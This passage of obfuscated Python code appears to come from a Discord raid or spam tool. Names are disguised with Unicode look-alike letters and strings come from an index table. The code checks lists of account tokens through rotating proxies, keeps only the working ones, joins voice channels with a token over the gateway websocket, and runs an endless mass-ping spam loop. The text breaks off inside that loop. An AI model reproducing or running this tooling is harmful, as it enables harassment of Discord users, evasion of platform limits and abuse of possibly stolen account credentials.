𝗜𝙉𝗜𝘕𝙡𝙡𝗜𝙈𝙄𝗜𝘭𝘔𝙡𝙡𝘐𝙡𝘭𝙉𝘕𝗜𝗹𝙡𝙈𝗡𝗹𝗡𝘭𝘔𝙄𝗠𝗜𝗠[233], 𝙄𝘕𝘐𝙉𝗹𝘭𝙄𝘔𝗜𝘐𝙡𝘔𝘭𝙡𝗜𝗹𝘭𝘕𝘕𝘐𝗹𝗹𝙈𝗡𝘭𝗡𝗹𝙈𝙄𝘔𝙄𝙈[223]: 𝙄𝗡𝙄𝙉𝙡𝘭𝘐𝗠𝙄𝗜𝘭𝗠𝙡𝘭𝙄𝘭𝘭𝙉𝘕𝗜𝘭𝘭𝙈𝗡𝘭𝙉𝘭𝘔𝙄𝘔𝘐𝘔[234], 𝘐𝙉𝗜𝙉𝗹𝗹𝙄𝗠𝘐𝙄𝙡𝙈𝙡𝗹𝙄𝙡𝙡𝘕𝗡𝗜𝗹𝘭𝘔𝙉𝗹𝘕𝘭𝗠𝘐𝗠𝗜𝙈[224]: 𝙄𝗡𝗜𝘕𝗹𝘭𝘐𝘔𝘐𝙄𝙡𝙈𝙡𝗹𝗜𝘭𝙡𝙉𝙉𝙄𝘭𝘭𝘔𝘕𝙡𝘕𝙡𝙈𝘐𝗠𝙄𝘔[235], 𝙄𝗡𝗜𝙉𝗹𝘭𝙄𝙈𝗜𝙄𝘭𝗠𝙡𝘭𝙄𝘭𝗹𝘕𝗡𝗜𝘭𝙡𝗠𝙉𝙡𝗡𝙡𝘔𝙄𝙈𝘐𝗠[225]: 𝙄𝗡𝗜𝙉𝘭𝙡𝗜𝘔𝘐𝗜𝙡𝙈𝙡𝗹𝘐𝙡𝙡𝗡𝘕𝙄𝗹𝙡𝙈𝙉𝘭𝙉𝘭𝘔𝘐𝗠𝗜𝘔[236], 𝘐𝘕𝘐𝘕𝘭𝗹𝗜𝙈𝘐𝗜𝙡𝙈𝘭𝙡𝙄𝘭𝗹𝙉𝙉𝘐𝘭𝙡𝗠𝗡𝙡𝘕𝗹𝘔𝘐𝘔𝙄𝘔[226]: 𝘐𝙉𝗜𝙉𝙡𝙡𝗜𝘔𝙄𝘐𝗹𝘔𝗹𝗹𝗜𝘭𝗹𝘕𝙉𝗜𝘭𝙡𝙈𝘕𝗹𝗡𝘭𝙈𝗜𝘔𝘐𝙈[237], 𝗜𝗡𝘐𝗡𝗹𝗹𝘐𝘔𝘐𝙄𝘭𝗠𝙡𝗹𝙄𝘭𝘭𝗡𝙉𝘐𝘭𝙡𝗠𝙉𝘭𝘕𝘭𝘔𝘐𝗠𝘐𝗠[227]: 𝘐𝗡𝙄𝙉𝘭𝗹𝘐𝘔𝘐𝗜𝗹𝘔𝘭𝗹𝗜𝗹𝗹𝗡𝙉𝘐𝗹𝗹𝙈𝙉𝗹𝗡𝘭𝗠𝘐𝙈𝙄𝗠[238], 𝗜𝘕𝙄𝙉𝙡𝙡𝙄𝙈𝘐𝙄𝙡𝘔𝙡𝘭𝗜𝘭𝘭𝗡𝘕𝗜𝗹𝙡𝙈𝘕𝘭𝘕𝗹𝘔𝘐𝙈𝘐𝘔[133]: 𝘐𝙉𝙄𝗡𝘭𝘭𝘐𝙈𝙄𝘐𝙡𝙈𝗹𝗹𝙄𝙡𝗹𝘕𝗡𝙄𝗹𝘭𝗠𝘕𝘭𝗡𝙡𝘔𝗜𝙈𝗜𝙈[239], 𝘐𝙉𝙄𝙉𝘭𝘭𝙄𝙈𝗜𝙄𝗹𝙈𝗹𝙡𝗜𝗹𝙡𝗡𝙉𝘐𝘭𝙡𝘔𝗡𝘭𝗡𝙡𝘔𝘐𝘔𝙄𝗠[228]: 𝘐𝙉𝗜𝙉𝙡𝗹𝗜𝗠𝙄𝙄𝗹𝗠𝘭𝘭𝘐𝙡𝙡𝙉𝙉𝗜𝘭𝙡𝙈𝙉𝙡𝙉𝗹𝗠𝗜𝗠𝙄𝗠[240], 𝘐𝙉𝘐𝙉𝙡𝗹𝙄𝗠𝙄𝘐𝙡𝗠𝙡𝗹𝗜𝙡𝘭𝗡𝘕𝘐𝙡𝙡𝙈𝘕𝘭𝗡𝘭𝘔𝘐𝗠𝙄𝘔[134]: 𝙄𝙉𝙄𝘕𝘭𝙡𝙄𝘔𝙄𝗜𝙡𝘔𝙡𝘭𝘐𝘭𝙡𝗡𝗡𝘐𝙡𝙡𝘔𝘕𝗹𝗡𝗹𝙈𝗜𝗠𝙄𝗠[230], 𝘐𝗡𝙄𝗡𝙡𝘭𝘐𝙈𝘐𝗜𝙡𝘔𝙡𝗹𝗜𝘭𝗹𝘕𝗡𝗜𝘭𝘭𝘔𝘕𝙡𝘕𝙡𝗠𝗜𝙈𝘐𝗠[229]: 𝗜𝗡𝗜𝗡𝘭𝗹𝘐𝘔𝘐𝘐𝘭𝙈𝙡𝙡𝘐𝗹𝗹𝙉𝗡𝙄𝗹𝗹𝗠𝗡𝙡𝙉𝗹𝗠𝘐𝘔𝗜𝗠[241], 𝘐𝘕𝗜𝘕𝗹𝙡𝗜𝘔𝙄𝙄𝙡𝙈𝘭𝙡𝘐𝗹𝗹𝗡𝘕𝘐𝗹𝗹𝙈𝗡𝗹𝗡𝙡𝘔𝗜𝘔𝗜𝗠[135]: 𝗜𝗡𝙄𝗡𝗹𝙡𝗜𝘔𝙄𝙄𝙡𝙈𝙡𝘭𝘐𝘭𝙡𝗡𝘕𝘐𝙡𝘭𝙈𝙉𝘭𝘕𝘭𝘔𝙄𝘔𝘐𝙈[242]}

def check_token(token):
    𝗵𝗲𝘢𝗱𝗲𝘳𝘀 = 𝗛𝗲𝙖𝗱𝙚𝙧𝙨(𝘵𝗼𝙠𝗲𝙣)
    try:
        if 𝘱𝙧𝙤𝘹𝙮:
            𝙧𝘦𝘴𝙥𝗼𝘯𝘀𝘦 = 𝘳𝘦𝙦𝙪𝙚𝙨𝘁𝙨.get(𝙄𝗡𝙄𝙉𝗹𝙡𝘐𝙈𝙄𝙄𝗹𝗠𝙡𝘭𝙄𝙡𝗹𝗡𝗡𝙄𝘭𝘭𝗠𝗡𝗹𝙉𝘭𝗠𝘐𝙈𝗜𝗠[243], headers=𝗵𝗲𝗮𝘥𝙚𝘳𝙨, proxy={𝘐𝘕𝗜𝘕𝘭𝙡𝘐𝗠𝙄𝘐𝗹𝗠𝗹𝙡𝗜𝙡𝙡𝗡𝙉𝗜𝙡𝘭𝙈𝗡𝙡𝗡𝗹𝙈𝘐𝘔𝙄𝙈[244]: 𝙄𝗡𝗜𝘕𝘭𝘭𝙄𝘔𝗜𝙄𝗹𝗠𝙡𝘭𝗜𝗹𝗹𝗡𝙉𝙄𝙡𝙡𝙈𝙉𝙡𝗡𝘭𝙈𝗜𝗠𝗜𝗠[246] + 𝙧𝗮𝙣𝘥𝘰𝙢.choice(𝗽𝙧𝘰𝘹𝙞𝘦𝘴), 𝙄𝗡𝗜𝘕𝗹𝗹𝗜𝙈𝗜𝗜𝘭𝗠𝘭𝘭𝙄𝘭𝘭𝗡𝗡𝙄𝘭𝘭𝗠𝙉𝘭𝘕𝙡𝙈𝘐𝗠𝗜𝙈[245]: 𝘐𝗡𝙄𝙉𝗹𝙡𝗜𝘔𝗜𝙄𝙡𝙈𝙡𝘭𝙄𝗹𝙡𝗡𝗡𝗜𝘭𝗹𝗠𝗡𝘭𝗡𝙡𝙈𝗜𝙈𝘐𝗠[246] + 𝙧𝙖𝘯𝙙𝙤𝙢.choice(𝙥𝗿𝙤𝘅𝙞𝗲𝘴)})
        else:
            𝗿𝗲𝘴𝘱𝘰𝙣𝙨𝙚 = 𝘳𝗲𝘲𝙪𝙚𝘀𝙩𝘴.get(𝗜𝗡𝘐𝙉𝗹𝙡𝘐𝘔𝗜𝙄𝗹𝗠𝗹𝗹𝘐𝘭𝙡𝗡𝙉𝘐𝙡𝗹𝘔𝙉𝙡𝗡𝙡𝗠𝘐𝘔𝘐𝙈[243], headers=𝙝𝙚𝗮𝘥𝗲𝙧𝘴)
        𝗱𝙣 = 𝙩𝗼𝗸𝙚𝘯.split(𝙄𝗡𝙄𝙉𝗹𝗹𝗜𝘔𝙄𝙄𝙡𝗠𝘭𝘭𝙄𝘭𝗹𝘕𝘕𝘐𝙡𝙡𝙈𝙉𝘭𝘕𝙡𝗠𝙄𝙈𝗜𝙈[247])
        𝙣𝙣 = 𝙙𝙣[0]
        if 𝗿𝙚𝙨𝘱𝙤𝘯𝘴𝙚.status_code == 200:
            𝘱𝘳𝘪𝗻𝙩(f"{𝗿}{𝗜𝘕𝙄𝙉𝗹𝙡𝗜𝗠𝙄𝗜𝘭𝗠𝗹𝙡𝘐𝙡𝙡𝙉𝙉𝘐𝗹𝘭𝙈𝘕𝙡𝗡𝗹𝙈𝗜𝙈𝙄𝙈[91]}{𝙙𝙖𝙩𝘦𝙩𝙞𝘮𝘦.datetime.now().strftime(f'{𝙜}{𝗜𝘕𝗜𝘕𝙡𝘭𝘐𝘔𝙄𝙄𝙡𝙈𝙡𝗹𝙄𝗹𝗹𝙉𝘕𝘐𝗹𝗹𝙈𝗡𝙡𝗡𝘭𝘔𝙄𝘔𝘐𝘔[92]}{𝙧}')}{𝗜𝗡𝗜𝗡𝗹𝘭𝙄𝘔𝗜𝗜𝙡𝘔𝘭𝗹𝗜𝘭𝘭𝗡𝘕𝘐𝙡𝗹𝗠𝗡𝗹𝘕𝗹𝙈𝘐𝗠𝘐𝗠[93]}{𝙧}{𝘐𝘕𝘐𝗡𝙡𝘭𝘐𝘔𝙄𝙄𝗹𝘔𝙡𝘭𝙄𝗹𝘭𝘕𝙉𝗜𝙡𝘭𝗠𝙉𝘭𝗡𝙡𝘔𝙄𝙈𝘐𝘔[91]}{𝙡𝙘}{𝗜𝘕𝙄𝘕𝘭𝙡𝘐𝗠𝗜𝙄𝗹𝘔𝘭𝗹𝘐𝗹𝗹𝘕𝙉𝘐𝗹𝗹𝘔𝙉𝘭𝗡𝙡𝗠𝘐𝘔𝗜𝗠[248]}{𝙧}{𝙄𝙉𝘐𝙉𝙡𝙡𝘐𝗠𝘐𝙄𝘭𝙈𝘭𝙡𝗜𝙡𝙡𝘕𝘕𝙄𝗹𝘭𝙈𝙉𝙡𝙉𝙡𝗠𝗜𝙈𝘐𝘔[93]}{𝗻𝙣}{𝗴}{𝘐𝙉𝘐𝗡𝙡𝘭𝗜𝘔𝙄𝘐𝘭𝙈𝙡𝗹𝘐𝗹𝘭𝗡𝘕𝗜𝗹𝘭𝗠𝘕𝙡𝘕𝗹𝘔𝙄𝙈𝘐𝗠[249]}")
            return True
        elif 𝗿𝗲𝘴𝙥𝘰𝗻𝘀𝙚.status_code == 403:
            𝙥𝘳𝙞𝙣𝙩(f"{𝗿}{𝗜𝘕𝗜𝙉𝘭𝙡𝗜𝗠𝘐𝙄𝘭𝗠𝙡𝗹𝗜𝗹𝙡𝗡𝙉𝘐𝗹𝙡𝙈𝙉𝙡𝘕𝘭𝘔𝙄𝗠𝙄𝙈[91]}{𝗱𝙖𝘵𝗲𝙩𝘪𝗺𝙚.datetime.now().strftime(f'{𝘨}{𝙄𝗡𝘐𝙉𝗹𝘭𝙄𝘔𝘐𝙄𝗹𝘔𝘭𝘭𝘐𝙡𝙡𝗡𝘕𝗜𝙡𝙡𝗠𝗡𝗹𝗡𝗹𝘔𝘐𝙈𝗜𝘔[92]}{𝙧}')}{𝗜𝙉𝗜𝙉𝘭𝙡𝗜𝙈𝗜𝘐𝙡𝙈𝘭𝙡𝙄𝗹𝘭𝘕𝘕𝘐𝘭𝗹𝘔𝗡𝗹𝙉𝘭𝗠𝗜𝘔𝙄𝗠[93]}{𝗿}{𝘐𝗡𝗜𝗡𝗹𝙡𝙄𝙈𝙄𝘐𝙡𝗠𝘭𝗹𝗜𝘭𝙡𝘕𝗡𝙄𝘭𝗹𝘔𝗡𝗹𝗡𝘭𝘔𝘐𝘔𝙄𝙈[91]}{𝘍𝘰𝙧𝘦.CYAN}{𝗜𝙉𝙄𝙉𝘭𝗹𝘐𝘔𝗜𝗜𝙡𝙈𝙡𝘭𝙄𝙡𝙡𝙉𝙉𝗜𝗹𝙡𝘔𝗡𝙡𝘕𝘭𝗠𝗜𝙈𝘐𝗠[250]}{𝗿}{𝘐𝗡𝗜𝘕𝘭𝙡𝙄𝗠𝙄𝘐𝘭𝙈𝘭𝗹𝘐𝗹𝗹𝙉𝘕𝙄𝗹𝘭𝗠𝗡𝘭𝘕𝗹𝗠𝘐𝘔𝙄𝙈[93]}{𝗻𝘯}{𝘨}{𝙄𝙉𝙄𝙉𝙡𝗹𝗜𝗠𝙄𝗜𝙡𝗠𝙡𝙡𝙄𝙡𝗹𝗡𝙉𝗜𝙡𝗹𝙈𝙉𝗹𝙉𝘭𝘔𝗜𝗠𝘐𝙈[249]}")
            return False
        else:
            𝘱𝘳𝘪𝘯𝘵(f"{𝘳}{𝘐𝗡𝘐𝗡𝗹𝗹𝙄𝘔𝘐𝗜𝗹𝘔𝙡𝙡𝙄𝙡𝘭𝘕𝙉𝘐𝘭𝙡𝘔𝘕𝘭𝙉𝘭𝗠𝗜𝘔𝗜𝗠[91]}{𝙙𝘢𝘵𝗲𝘵𝗶𝙢𝗲.datetime.now().strftime(f'{𝗴}{𝘐𝙉𝗜𝙉𝘭𝙡𝗜𝙈𝙄𝗜𝗹𝘔𝘭𝘭𝗜𝙡𝗹𝗡𝘕𝙄𝘭𝘭𝗠𝗡𝘭𝗡𝙡𝙈𝙄𝗠𝘐𝗠[92]}{𝘳}')}{𝘐𝗡𝘐𝗡𝘭𝘭𝘐𝘔𝗜𝗜𝗹𝙈𝙡𝙡𝘐𝘭𝗹𝗡𝗡𝘐𝘭𝘭𝘔𝙉𝗹𝙉𝙡𝗠𝗜𝙈𝗜𝘔[93]}{𝙧}{𝘐𝙉𝙄𝗡𝘭𝗹𝗜𝘔𝘐𝙄𝘭𝗠𝙡𝘭𝘐𝘭𝗹𝗡𝙉𝘐𝘭𝘭𝙈𝙉𝘭𝙉𝘭𝙈𝙄𝙈𝗜𝘔[91]}{𝙗}{𝙄𝘕𝙄𝗡𝘭𝙡𝘐𝘔𝘐𝙄𝙡𝙈𝘭𝗹𝙄𝘭𝘭𝙉𝘕𝙄𝘭𝘭𝘔𝘕𝘭𝘕𝘭𝙈𝙄𝗠𝗜𝘔[251]}{𝘳}{𝗜𝗡𝘐𝗡𝙡𝙡𝘐𝙈𝘐𝗜𝗹𝙈𝙡𝘭𝙄𝘭𝘭𝘕𝗡𝗜𝙡𝗹𝘔𝗡𝙡𝘕𝙡𝘔𝙄𝙈𝘐𝘔[93]}{𝘯𝗻}{𝙜}{𝘐𝙉𝙄𝗡𝗹𝘭𝗜𝗠𝙄𝙄𝗹𝗠𝙡𝙡𝘐𝘭𝗹𝙉𝗡𝙄𝙡𝘭𝙈𝘕𝙡𝗡𝙡𝙈𝙄𝘔𝗜𝘔[249]}")
            return False
    except:
        pass

def vc_joiner(token, guild, channel):
    𝙙𝘯 = 𝘵𝘰𝘬𝙚𝙣.split(𝗜𝙉𝙄𝘕𝙡𝗹𝙄𝘔𝘐𝙄𝗹𝘔𝙡𝗹𝗜𝗹𝘭𝗡𝗡𝘐𝘭𝙡𝘔𝘕𝘭𝗡𝗹𝘔𝘐𝙈𝘐𝙈[247])
    𝙣𝗻 = 𝘥𝙣[0]
    for _ in 𝗿𝘢𝘯𝘨𝙚(1):
        𝙬𝘴 = 𝗪𝙚𝘣𝙎𝙤𝙘𝙠𝘦𝘁()
        𝙬𝘴.connect(𝘐𝗡𝙄𝗡𝗹𝘭𝗜𝙈𝙄𝗜𝗹𝗠𝙡𝗹𝗜𝗹𝘭𝘕𝙉𝘐𝙡𝘭𝘔𝙉𝙡𝘕𝘭𝘔𝗜𝗠𝘐𝘔[252])
        𝙬𝙨.send(𝗷𝙨𝙤𝗻.dumps({𝘐𝗡𝗜𝙉𝘭𝗹𝗜𝙈𝘐𝘐𝙡𝙈𝗹𝘭𝗜𝘭𝙡𝙉𝘕𝘐𝗹𝘭𝗠𝙉𝘭𝘕𝙡𝙈𝘐𝙈𝘐𝘔[169]: 2, 𝗜𝘕𝙄𝙉𝗹𝙡𝘐𝘔𝘐𝗜𝘭𝘔𝙡𝘭𝘐𝗹𝗹𝘕𝘕𝗜𝗹𝙡𝙈𝘕𝙡𝘕𝙡𝗠𝘐𝘔𝗜𝗠[166]: {𝗜𝗡𝘐𝘕𝙡𝙡𝙄𝘔𝗜𝘐𝙡𝘔𝙡𝙡𝗜𝘭𝗹𝗡𝙉𝗜𝙡𝗹𝗠𝙉𝙡𝗡𝘭𝘔𝙄𝘔𝙄𝘔[253]: 𝘵𝘰𝘬𝘦𝘯, 𝙄𝙉𝗜𝗡𝗹𝗹𝘐𝘔𝙄𝘐𝗹𝗠𝙡𝘭𝘐𝙡𝙡𝙉𝘕𝘐𝗹𝗹𝘔𝘕𝘭𝗡𝗹𝗠𝗜𝘔𝙄𝘔[254]: {𝘐𝙉𝗜𝘕𝙡𝘭𝘐𝘔𝗜𝗜𝙡𝙈𝙡𝗹𝘐𝗹𝘭𝗡𝙉𝙄𝘭𝙡𝘔𝘕𝙡𝘕𝗹𝘔𝘐𝗠𝗜𝙈[255]: 𝗜𝗡𝙄𝗡𝙡𝘭𝙄𝗠𝙄𝗜𝙡𝙈𝗹𝙡𝙄𝗹𝗹𝘕𝗡𝗜𝙡𝗹𝗠𝗡𝗹𝙉𝘭𝗠𝙄𝗠𝗜𝙈[258], 𝙄𝘕𝘐𝘕𝗹𝙡𝘐𝘔𝙄𝙄𝗹𝗠𝗹𝘭𝗜𝗹𝗹𝘕𝘕𝙄𝗹𝙡𝙈𝘕𝙡𝘕𝘭𝘔𝘐𝗠𝘐𝙈[256]: 𝗜𝙉𝘐𝘕𝘭𝗹𝙄𝗠𝘐𝘐𝙡𝗠𝘭𝙡𝗜𝙡𝗹𝘕𝘕𝗜𝘭𝙡𝙈𝘕𝗹𝙉𝙡𝙈𝘐𝗠𝗜𝘔[259], 𝗜𝘕𝙄𝗡𝗹𝙡𝗜𝘔𝘐𝗜𝙡𝙈𝙡𝘭𝙄𝗹𝙡𝘕𝙉𝗜𝗹𝗹𝘔𝘕𝗹𝙉𝘭𝗠𝘐𝗠𝘐𝘔[257]: 𝘐𝘕𝗜𝙉𝗹𝗹𝗜𝙈𝙄𝙄𝘭𝘔𝗹𝙡𝗜𝙡𝙡𝙉𝗡𝘐𝘭𝘭𝘔𝗡𝙡𝘕𝗹𝗠𝗜𝘔𝗜𝘔[260]}}}))
        𝘸𝙨.send(𝙟𝘀𝙤𝗻.dumps({𝗜𝘕𝙄𝘕𝗹𝙡𝗜𝗠𝙄𝗜𝘭𝗠𝘭𝙡𝙄𝗹𝗹𝘕𝙉𝗜𝗹𝗹𝗠𝙉𝘭𝗡𝙡𝗠𝘐𝗠𝗜𝗠[169]: 4, 𝘐𝗡𝙄𝙉𝗹𝙡𝗜𝗠𝘐𝙄𝙡𝙈𝘭𝗹𝘐𝘭𝙡𝗡𝙉𝘐𝘭𝗹𝗠𝘕𝙡𝘕𝘭𝘔𝗜𝙈𝘐𝙈[166]: {𝘐𝘕𝘐𝙉𝙡𝗹𝘐𝘔𝘐𝙄𝘭𝘔𝙡𝘭𝙄𝘭𝙡𝙉𝗡𝗜𝙡𝙡𝙈𝘕𝘭𝙉𝙡𝙈𝘐𝘔𝘐𝘔[161]: 𝙜𝘂𝘪𝘭𝘥, 𝙄𝙉𝗜𝗡𝗹𝗹𝗜𝙈𝙄𝙄𝗹𝘔𝘭𝙡𝙄𝗹𝘭𝗡𝗡𝗜𝗹𝙡𝘔𝗡𝙡𝙉𝗹𝗠𝗜𝘔𝗜𝗠[261]: 𝗰𝙝𝘢𝗻𝘯𝙚𝙡, 𝙄𝘕𝘐𝙉𝙡𝗹𝘐𝗠𝗜𝗜𝗹𝘔𝘭𝘭𝙄𝙡𝗹𝘕𝗡𝙄𝙡𝗹𝗠𝘕𝙡𝗡𝘭𝘔𝗜𝙈𝗜𝘔[262]: False, 𝗜𝙉𝘐𝗡𝗹𝗹𝙄𝘔𝙄𝙄𝗹𝗠𝙡𝘭𝗜𝗹𝙡𝗡𝘕𝙄𝗹𝗹𝘔𝗡𝙡𝙉𝘭𝗠𝙄𝘔𝗜𝘔[263]: False}}))
        𝙥𝗿𝙞𝗻𝘵(f"{𝗿}{𝙄𝙉𝙄𝗡𝗹𝘭𝗜𝘔𝗜𝘐𝗹𝘔𝗹𝘭𝘐𝙡𝗹𝙉𝗡𝙄𝗹𝙡𝗠𝗡𝗹𝘕𝙡𝗠𝗜𝘔𝙄𝗠[91]}{𝙙𝙖𝙩𝘦𝘁𝙞𝙢𝘦.datetime.now().strftime(f'{𝘨}{𝘐𝗡𝗜𝘕𝗹𝙡𝙄𝘔𝗜𝙄𝙡𝙈𝗹𝗹𝗜𝗹𝗹𝗡𝘕𝘐𝘭𝗹𝘔𝙉𝙡𝘕𝘭𝗠𝗜𝘔𝗜𝙈[92]}{𝘳}')}{𝙄𝗡𝙄𝗡𝙡𝙡𝗜𝗠𝗜𝗜𝙡𝗠𝘭𝙡𝙄𝙡𝙡𝘕𝗡𝙄𝗹𝗹𝘔𝗡𝗹𝙉𝗹𝗠𝘐𝗠𝘐𝘔[93]}{𝗿}{𝙄𝙉𝙄𝗡𝘭𝗹𝙄𝘔𝙄𝘐𝙡𝙈𝗹𝘭𝙄𝗹𝗹𝗡𝙉𝙄𝘭𝙡𝘔𝗡𝘭𝙉𝘭𝗠𝙄𝙈𝗜𝘔[91]}{𝗹𝘤}{𝙄𝙉𝗜𝗡𝙡𝗹𝗜𝗠𝗜𝙄𝙡𝘔𝘭𝙡𝙄𝙡𝗹𝗡𝙉𝗜𝗹𝙡𝙈𝘕𝙡𝘕𝘭𝗠𝘐𝘔𝘐𝙈[264]}{𝘳}{𝗜𝙉𝗜𝘕𝘭𝙡𝗜𝘔𝗜𝘐𝘭𝗠𝗹𝙡𝙄𝘭𝙡𝗡𝙉𝗜𝙡𝗹𝙈𝙉𝗹𝗡𝗹𝘔𝘐𝙈𝗜𝗠[93]}{𝙣𝙣}{𝗴}{𝘐𝗡𝗜𝗡𝙡𝗹𝘐𝘔𝘐𝘐𝗹𝙈𝙡𝘭𝘐𝗹𝙡𝙉𝘕𝗜𝙡𝘭𝙈𝘕𝙡𝗡𝗹𝙈𝘐𝘔𝘐𝙈[249]}")

def save_tokens(file_path):
    𝘃𝙖𝙡𝙞𝙙_𝙩𝘰𝙠𝘦𝘯𝙨 = 0
    𝙩𝙤𝙠𝗲𝗻𝘴_𝘷𝘢𝘭𝗶𝗱 = []
    𝘁𝙤𝗸𝘦𝗻𝘀 = 𝙤𝙥𝗲𝙣(𝙛𝙞𝗹𝗲_𝙥𝘢𝘵𝘩, 𝙄𝘕𝙄𝗡𝘭𝘭𝘐𝙈𝗜𝗜𝙡𝗠𝘭𝘭𝗜𝘭𝙡𝗡𝘕𝘐𝘭𝘭𝙈𝗡𝙡𝘕𝗹𝙈𝗜𝙈𝗜𝙈[30]).read().splitlines()
    for 𝘁𝗼𝗸𝘦𝙣 in 𝘁𝙤𝘬𝙚𝗻𝘴:
        if 𝘤𝙝𝙚𝘤𝗸_𝙩𝘰𝙠𝗲𝗻(𝘁𝘰𝗸𝘦𝗻):
            𝙫𝗮𝙡𝗶𝘥_𝘁𝙤𝙠𝘦𝙣𝙨 += 1
            𝙩𝗼𝗸𝙚𝙣𝙨_𝘃𝘢𝗹𝗶𝘥.append(𝘁𝘰𝗸𝗲𝘯)
    with 𝙤𝘱𝗲𝗻(𝘧𝘪𝘭𝙚_𝗽𝘢𝘵𝗵, 𝘐𝘕𝗜𝘕𝘭𝗹𝗜𝘔𝗜𝘐𝗹𝘔𝙡𝘭𝙄𝘭𝗹𝘕𝙉𝗜𝙡𝘭𝗠𝘕𝗹𝗡𝗹𝗠𝙄𝙈𝗜𝙈[213]) as 𝘧:
        𝗳.truncate(0)
    with 𝗼𝗽𝙚𝗻(𝘧𝘪𝙡𝗲_𝙥𝗮𝙩𝗵, 𝙄𝗡𝘐𝗡𝗹𝘭𝗜𝘔𝘐𝙄𝗹𝗠𝙡𝙡𝗜𝘭𝗹𝗡𝘕𝘐𝘭𝙡𝘔𝙉𝘭𝘕𝗹𝘔𝙄𝗠𝘐𝘔[215]) as 𝗳:
        for 𝘁𝘰𝗸𝗲𝙣 in 𝘵𝙤𝗸𝗲𝘯𝙨_𝘃𝗮𝙡𝘪𝙙:
            𝘧.write(𝙩𝘰𝘬𝗲𝗻 + 𝗜𝗡𝙄𝗡𝘭𝘭𝙄𝘔𝗜𝗜𝗹𝗠𝗹𝗹𝘐𝗹𝙡𝗡𝙉𝘐𝙡𝘭𝙈𝘕𝗹𝗡𝘭𝙈𝙄𝗠𝗜𝙈[63])

def massping(token, channel, message, delay, pings):
    𝙝𝙚𝘢𝘥𝙚𝙧𝘀 = 𝙃𝗲𝗮𝙙𝘦𝘳𝘀(𝘵𝘰𝗸𝙚𝘯)
    while True:
        𝘥𝙣 = 𝘁𝗼𝗸𝗲𝗻.split(𝘐𝗡𝗜𝗡𝙡𝘭𝙄𝘔𝙄𝘐𝙡𝙈𝗹𝗹𝙄𝘭𝗹𝙉𝘕𝗜𝘭𝗹𝘔𝗡𝗹𝗡𝗹𝙈𝘐𝗠𝘐𝘔[247])
        𝗻𝗻 = 𝙙𝘯[0]
        𝘥𝙖𝙩𝗮 = {𝙄𝙉𝘐𝗡𝘭𝙡𝘐𝙈𝗜𝙄𝙡𝗠𝘭𝙡𝗜𝗹𝘭𝙉𝘕𝘐𝙡𝙡𝘔𝗡𝙡𝙉𝘭𝗠𝗜𝙈𝙄𝘔[265]: f'{𝗺𝗲𝘀𝘀𝗮𝘨𝗲}{𝗜𝙉𝘐𝘕𝗹𝗹𝗜𝙈𝙄𝙄𝙡𝗠𝙡𝗹𝗜𝗹𝙡𝘕𝙉𝘐𝘭𝗹𝙈𝙉𝘭𝗡𝙡𝘔𝙄𝙈𝙄𝗠[98]}{𝗴𝙚𝘁𝘳𝙖𝘯𝗱𝗼𝘮𝘪𝗱𝘀(𝙬𝘂𝘾8𝗯𝙯𝙣9𝘭𝙦9𝗖𝗞𝘽𝘌𝘗𝙆𝗹𝘰𝗸𝙏𝘠𝘐9𝘿𝘋1𝘚𝘦𝘕𝙛𝘩.mro()[9](𝙥𝘪𝙣𝙜𝘀))}'}
        𝘴𝙡𝙚𝗲𝗽(𝙙𝗲𝗹𝗮𝙮)
        if 𝘱𝘳𝗼𝘹𝙮:
            𝘳𝘳 = 𝘳𝘦𝘲𝙪𝙚𝘴𝘵𝙨.post(f'{𝗜𝙉𝗜𝙉𝙡𝙡𝘐𝙈𝗜𝘐𝘭𝙈𝘭𝘭𝙄𝘭𝙡𝘕𝘕𝗜𝙡𝙡𝗠𝗡𝘭𝘕𝘭𝙈𝙄𝘔𝘐𝘔[266]}{𝗰𝗵𝗮𝙣𝗻𝗲𝘭}{𝘐𝘕𝗜𝘕𝙡𝘭𝙄𝗠𝗜𝙄𝙡𝘔𝗹𝗹𝙄𝙡𝘭𝗡𝘕𝘐𝘭𝘭𝘔𝗡𝗹𝙉𝙡𝙈𝘐𝘔𝙄𝘔[267]}', headers=𝘩𝙚𝙖𝗱𝗲𝘳𝘴, json=𝗱𝙖𝘁𝘢, proxy={𝗜𝗡𝘐𝗡𝘭𝘭𝙄𝗠𝙄𝗜𝗹𝘔𝙡𝙡𝘐𝘭𝙡𝘕𝙉𝗜𝙡𝘭𝙈𝗡𝙡𝘕𝗹𝙈𝘐𝘔𝘐𝗠[244]: 𝗜𝙉𝘐𝘕𝗹𝗹𝗜𝙈𝙄𝗜𝗹𝙈𝙡𝙡𝗜𝘭𝙡𝘕𝙉𝙄𝙡𝗹𝙈𝙉𝙡𝗡𝘭𝘔𝗜𝗠𝗜𝙈[246] + 𝙧𝘢𝘯𝘥𝗼𝙢.choice(𝘱𝘳𝘰𝘹𝘪𝘦𝘴), 𝘐𝘕𝘐𝗡𝗹𝘭𝙄𝗠𝙄𝘐𝗹𝗠𝘭𝙡𝗜𝘭𝗹𝙉𝘕𝙄𝙡𝘭𝗠𝙉𝘭𝗡𝘭𝙈𝙄𝘔𝙄𝗠[245]: 𝘐𝗡𝗜𝗡𝙡𝘭𝘐𝘔𝘐𝗜𝗹𝙈𝗹𝘭𝙄𝙡𝘭𝗡𝙉𝙄𝙡𝘭𝗠𝗡𝙡𝙉𝙡𝘔𝘐𝗠𝗜𝘔[246] + 𝙧𝘢𝘯𝗱𝘰𝙢.choice(𝘱𝗿𝘰𝘅𝙞𝘦𝘀)})
        else:
            𝙧𝗿 = 𝘳𝗲𝗾𝘂𝗲𝘴𝘵𝘀.post(f'{𝗜𝗡𝘐𝙉𝘭𝙡𝙄𝙈𝙄𝙄𝘭𝙈𝘭𝘭𝗜𝗹𝘭𝙉𝙉𝘐𝗹𝙡𝘔𝘕𝙡𝘕𝗹𝙈𝘐𝘔𝘐𝗠[266]}{𝙘𝙝𝗮𝘯𝗻𝙚𝗹}{𝘐𝘕𝗜𝘕𝗹𝙡𝗜𝗠𝗜𝗜𝘭𝗠𝙡𝗹𝗜𝙡𝙡𝘕𝗡𝗜𝘭𝘭𝙈𝘕𝗹𝘕𝗹𝘔𝙄𝘔𝙄𝗠[267]}', headers=𝙝𝗲𝙖𝙙𝗲𝙧𝙨, json=𝗱𝘢𝘁𝗮)
        if 𝗿𝙧.status_code == 200:
